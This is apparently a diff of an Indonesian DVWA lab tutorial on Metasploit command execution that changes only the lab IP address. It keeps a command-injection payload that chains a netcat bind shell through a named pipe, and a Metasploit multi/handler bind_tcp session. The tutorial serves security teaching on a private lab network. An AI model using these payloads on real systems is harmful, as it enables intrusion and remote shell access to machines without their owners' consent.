@@ -11,7 +11,7 @@ Inti dari Lesson 4 adalah implementasi Metasploit command execution dengan mengg
 1. Akses website dari DVWA dengan cara
 
 ```
-http://192.168.1.103/dvwa/login.php/;
+http://192.168.1.6/dvwa/login.php/;
 ```
 
 **NOTE**
@@ -20,7 +20,7 @@ http://192.168.1.103/dvwa/login.php/;
 2. Masuk ke dalam **Command Execution** dan masukan command lalu klik **Submit**
 
 ```
-192.168.1.103;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+192.168.1.6;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
 ```
 
 Hasil yang akan didapat adalah:
@@ -40,7 +40,7 @@ Hasil yang akan didapat adalah:
 use multi/handler
 set PAYLOAD linux/x86/shell/bind_tcp
 show options
-set RHOST 192.168.1.103
+set RHOST 192.168.1.6
 exploit
 ```
 
